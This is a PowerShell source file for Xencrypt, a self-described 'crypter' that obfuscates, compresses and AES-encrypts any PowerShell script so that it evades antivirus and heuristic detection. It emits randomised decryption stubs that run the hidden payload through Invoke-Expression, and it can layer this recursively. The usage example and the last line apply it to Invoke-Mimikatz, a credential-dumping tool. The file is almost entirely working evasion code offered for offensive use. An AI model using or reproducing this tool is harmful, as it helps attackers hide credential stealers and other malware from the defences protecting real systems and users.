#    Xencrypt - Powershell crypter
#    Copyright (C) 2020 Xentropy ( @SamuelAnttila )
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function Create-Var() {
        #Variable length help vary the length of the file generated
        #old: [guid]::NewGuid().ToString().Substring(24 + (Get-Random -Maximum 9))
        $set = "abcdefghijkmnopqrstuvwxyz"
        (1..(4 + (Get-Random -Maximum 6)) | %{ $set[(Get-Random -Minimum 0 -Maximum $set.Length)] } ) -join ''
}


function Generate-HighEntropy-VarName {
    #Gotta avoid curly braces, colons and backticks
    '{' + -join((9,10,13) + (32..57) + (59..95) + (97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 20) | % {[char]$_}) + '}'
}

function Generate-LowEntropy-VarName {
    -join((48..57) + (97..122) + (65..90) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 20) | % {[char]$_})
}


function Invoke-Xobfuscation {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $code = $(Throw("-code is required"))
    )
    $tokens = $null
    $errors = $null

    #Variables that probably shouldn't be changed...
    $blacklistVariables = @('$$','$?','$^','$_','$args','$consolefilename','$error','$event','$eventargs','$eventsubscriber','$executioncontext','$false','$foreach','$home','$host','$input','$iscoreclr','$ismacos','$islinux','$iswindows','$lastexitcode','$matches','$myinvocation','$nestedpromptlevel','$null','$pid','$profile','$psboundparameters','$pscmdlet','$pscommandpath','$psculture','$psdebugcontext','$pshome','$psitem','$psscriptroot','$pssenderinfo','$psuiculture','$psversiontable','$pwd','$sender','$sender','$shellid','$stacktrace','$switch','$this','$true')

    $ast = [System.Management.Automation.Language.Parser]::ParseInput($code, [ref] $tokens, [ref] $errors)

    #To track old -> new variable names
    $variableTracking = @{}
    #As we change vars, offsets will shift by this amount

    #Characters that should never be escaped with backtics
    $charBlackList = @('t','n','r','a','v','f','b','0',"'",'"','`')

    $accumulatedOffset = 0
    $progress=1

    foreach ($token in $tokens){
        
        Write-Progress -Id 0 -Activity "Obfuscating..." -Status "Progress: $progress/$($tokens.count)" -PercentComplete ($progress/$tokens.count*100)

        $start = $token.Extent.StartOffset+$accumulatedOffset
        $end = $token.Extent.EndOffset+$accumulatedOffset-1
        #Variable obfuscation
        
        if($token.Kind -eq 'Variable'){
            #certain variables should not be randomized
            if(!$blacklistVariables.Contains($token.Extent.Text.ToLower())) {  
                if(!$variableTracking.Contains($token.Name)) {
                    # Save new var name mapped to old one
                    #Combine high and low level entropy variable names.
                    if ((Get-Random -Minimum 0 -Maximum 2) -eq 1) {
                        $randVar = Generate-HighEntropy-VarName
                    } else {
                        $randVar = Generate-LowEntropy-VarName
                    }
                    $variableTracking.Add($token.Name,$randVar)

                    #replace old with new
                    $code = $code.Remove($start+1, $end-$start).Insert($start+1, $randVar)
                    $accumulatedOffset += $randVar.Length-$token.Name.length
                } else {
                    #if a var has already been assgined a new random name, use that one rather than generating a new one
                    $randVar = $variableTracking[$token.Name]
                    $code = $code.Remove($start+1, $end-$start).Insert($start+1, $randVar)
                    $accumulatedOffset += $randVar.Length-$token.Name.length
                }
            }
        } elseif ($token.Kind -eq "Comment") {
            # strip all comments without mercy
            $code = $code.Remove($start, $end-$start+1)
            $accumulatedOffset -= $token.Extent.Text.Length
        } elseif ($token.Kind -eq "StringLiteral") {
            #insert random string delimiters
            $outputStr = ''
            if ($token.Extent.Text.Length -lt 500) {
                for($i=$start;$i -le $end; $i++){
                    #30% chance
                    if ((Get-Random -Maximum 11 -Minimum 1) -ge 7 -and $i -gt $start -and $i -lt $end) {
                        $outputStr += "'+'"+$code[$i] 
                    } else {
                        $outputStr += $code[$i] 
                    }
                }
                
                $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
                $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
            } else {
                #long stringprocessing
                for($i=$start;$i -le $end; $i+= (Get-Random -Minimum 10 -Maximum 100)){
                    if (!$charBlackList.Contains([string]$code[$i]) -and $i -gt $start -and $i -lt $end) {
                        $code = $code.Insert($start, "'+'")
                        $accumulatedOffset += 3
                    }  
                    Write-Progress -Id 1 -ParentId 0 -Activity "Processing long string..." -Status "Progress: $($i-$start)/$($end-$start)" -PercentComplete (($i-$start)/($end-$start)*100)
                }
            }
        } elseif ($token.Kind -eq "StringExpandable") {
            #double quotes (expandable)
            #backtics
            $outputStr = ''
            if ($token.Extent.Text.Length -lt 500) {
                for($i=$start;$i -le $end; $i++){
                    if ((Get-Random -Maximum 2 -Minimum 0) -eq 1 -and !$charBlackList.Contains([string]$code[$i])  -and $i -gt $start -and $i -lt $end ) {
                        $outputStr += '`'+$code[$i] 
                    } else {
                        $outputStr += $code[$i] 
                    }
                   
                }
                $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
                $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
                
            } else {
                #long string processing
                for($i=$start;$i -le $end; $i+= (Get-Random -Minimum 10 -Maximum 100)){
                    if (!$charBlackList.Contains([string]$code[$i]) -and $i -gt $start -and $i -lt $end) {
                        $code = $code.Insert($start, '`')
                        $accumulatedOffset += 1 
                    }  
                }
                Write-Progress -Id 1 -ParentId 0 -Activity "Processing long string..." -Status "Progress: ($i-$start)/$($end-$start)" -PercentComplete (($i-$start)/$($end-$start)*100)
                
                
            }
        } elseif ($token.Kind -eq 'Generic') {
            #backtics
            $outputStr = ''
            for($i=$start;$i -le $end; $i++){
                if ((Get-Random -Maximum 3 -Minimum 0) -ge 1 -and !$charBlackList.Contains([string]$code[$i])) {
                    #Backtic
                    # We need to check if the case randomization would cause issues with special escape sequences.
                    if((Get-Random -Maximum 2 -Minimum 0) -eq 1 -and !$charBlackList.Contains(([string]$code[$i]).ToLower())) {
                        $outputStr += '`'+([string]$code[$i]).ToLower()
                    } else {
                        $outputStr += '`'+([string]$code[$i]).ToUpper()
                    }
                } else {
                    #no backtic
                    if((Get-Random -Maximum 2 -Minimum 0) -eq 1 ) {
                        $outputStr += ([string]$code[$i]).ToLower()
                    } else {
                        $outputStr += ([string]$code[$i]).ToUpper()
                    }
                }
            }
            $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
            $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
        } elseif ( $token.Kind -eq 'Identifier' ) {
            #backtics
            $outputStr = ''
            for($i=$start;$i -le $end; $i++){
                # No backticks in identifiers
                if((Get-Random -Maximum 2 -Minimum 0) -eq 1 ) {
                    $outputStr += ([string]$code[$i]).ToLower()
                } else {
                    $outputStr += ([string]$code[$i]).ToUpper()
                }
            }
            $code = $code.Remove($start, $end-$start+1).Insert($start, $outputStr)
            $accumulatedOffset += $outputStr.Length-$token.Extent.Text.Length
             
        }
        $progress += 1
    }
    $code
}


function Invoke-Xencrypt {
 <#
    .SYNOPSIS
    Invoke-Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.
    .DESCRIPTION
     Invoke-Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     The output script is highly randomized in order to make static analysis even more difficut.
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.
    .PARAMETER InFile
    Specifies the script to obfuscate/encrypt.
    .PARAMETER OutFile
    Specifies the output script.
    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 2.
    .PARAMETER SkipObfuscation
    If specified, skips the default obfuscation step. Mostly useful if your input script is already obfuscated or unlikely to get flagged during dynamic execution.
    .EXAMPLE
    PS> Invoke-Xencrypt -InFile Mimikatz.ps1 -OutFile banana.ps1 -Iterations 3
    .LINK
    https://github.com/the-xentropy/xencrypt
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $infile = $(Throw("-InFile is required")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required")),
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [switch] $skipObfuscation = $false,
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $iterations = 1
    )
    Process {
        Write-Output "
Xencrypt Copyright (C) 2020 Xentropy ( @SamuelAnttila )
This program comes with ABSOLUTELY NO WARRANTY!
This is free software, and you are welcome to redistribute it
under certain conditions.
"

        # read
        if (!$skipObfuscation) {
            Write-Output "[*] Reading '$($infile)' ..."
            $code = [System.IO.File]::ReadAllText($infile)

            Write-Output "[*] Obfuscating input script (This can take a while) ..."
            $obfcode = [string](Invoke-Xobfuscation -code $code)
  
            $codebytes = [system.Text.Encoding]::UTF8.GetBytes($obfcode)
        } else {
            $codebytes = [System.IO.File]::ReadAllBytes($infile)
        }
        for ($i = 1; $i -le $iterations; $i++) {
            # Decide on encryption params ahead of time 
            
            Write-Output "[*] Starting code layer  ..."
            $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
            $paddingmode = $paddingmodes | Get-Random
            $ciphermodes = 'ECB','CBC'
            $ciphermode = $ciphermodes | Get-Random

            $keysizes = 128,192,256
            $keysize = $keysizes | Get-Random

            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = $compressiontypes | Get-Random

            # compress
            Write-Output "[*] Compressing ..."
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {
                $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {
                $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
            }
      	    $compressionStream.Write( $codebytes, 0, $codebytes.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedBytes = $output.ToArray()

            # generate key
            Write-Output "[*] Generating encryption key ..."
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            if ($ciphermode -eq 'CBC') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
            } elseif ($ciphermode -eq 'ECB') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
            }

            if ($paddingmode -eq 'PKCS7') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            }

            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 256
            $aesManaged.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

            # encrypt
            Write-Output "[*] Encrypting ..."
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
            [byte[]] $fullData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
            # write
            Write-Output "[*] Finalizing code layer ..."

            # now, randomize the order of any statements that we can to further increase variation

            $stub_template = ''

            $code_alternatives  = @()
            $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
            $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
            $code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''

            $code_alternatives  = @()
            $code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
            $code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
            $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
            $code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
            $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''

            $code_alternatives  = @()
            $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
            $code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''


            if ($compressiontype -eq "Gzip") {
                $stub_template += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $stub_template += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
            }
            $stub_template += '${5}.CopyTo(${7})' + "`r`n"

            $code_alternatives  = @()
            $code_alternatives += '${5}.Close()' + "`r`n"
            $code_alternatives += '${4}.Dispose()' + "`r`n"
            $code_alternatives += '${6}.Close()' + "`r`n"
            $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''

            $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
            
        
            # it's ugly, but it beats concatenating each value manually.
            $code = $stub_template -f $b64encrypted, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
            $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
        }
        Write-Output "[*] Writing '$($outfile)' ..."
        [System.IO.File]::WriteAllText($outfile,$code)
        Write-Output "[+] Done!"
    }
}
Invoke-Xencrypt C:\Users\Sam\Desktop\xencrypt\Invoke-Mim`ikatz.ps1 C:\tools\banana.ps1